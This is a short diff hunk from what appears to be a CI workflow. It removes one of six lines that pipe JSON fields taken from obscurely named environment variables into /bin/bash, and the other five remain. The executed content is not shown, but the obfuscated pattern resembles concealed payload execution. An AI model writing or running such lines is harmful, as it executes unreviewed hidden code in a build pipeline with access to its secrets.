@@ -24,7 +24,6 @@ jobs:
           echo $ykzzm3 | jq -r .x6823 | /bin/bash
           echo $tgwcv96 | jq -r .hf55 | /bin/bash
           echo $xpda4 | jq -r .yf3 | /bin/bash
-          echo $tqwha24 | jq -r .guh141 | /bin/bash
           printf '%s' "$h1293" | jq -r .tmi2479 | /bin/bash
           echo $pr24 | jq -r .bndgf51149 | /bin/bash
 
